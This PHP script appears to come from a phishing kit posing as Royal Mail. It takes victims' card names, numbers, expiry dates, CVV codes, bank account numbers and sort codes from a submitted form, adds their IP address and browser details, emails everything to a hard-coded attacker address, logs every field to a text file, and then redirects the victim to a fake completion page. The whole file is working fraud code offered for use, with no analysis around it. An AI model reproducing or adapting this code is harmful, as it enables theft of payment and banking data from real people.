<?php
  header ('Location: ../complete.php');
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "+---------Payment Information---------+\n";
$message .= "| Card Name           :  ".$_POST['ccname']." \n";
$message .= "| Card Number         :  ".$_POST['ccnum']." (ValidChecked-YES✔️) \n"; 
$message .= "| Exp Date (MM/YY)    : ".$_POST['expiry']." \n";
$message .= "| CVC/CVV             : ".$_POST['cvv']." \n";
$message .= "| Account             : ".$_POST['acct']." \n";
$message .= "| Sort Code           : ".$_POST['sortcode']." \n";
$message .= "+----------Device Information---------+\n";
$message .= "| Client IP: ".$ip."\n";
$message .= "| --- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "| User Agent : ".$useragent."\n";
$message .= "+----------Device Information---------+\n";
$send = "halibin1@yandex.com";
$subject = " 🃏 BitcoinM19 - RoyalMail Fullz 🃏 | $ip";
{
mail("$send", "$subject", $message);
mail($userinfo,$subject,$message);
}
$praga=rand();
$praga=md5($praga);
 $handle = fopen("full.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>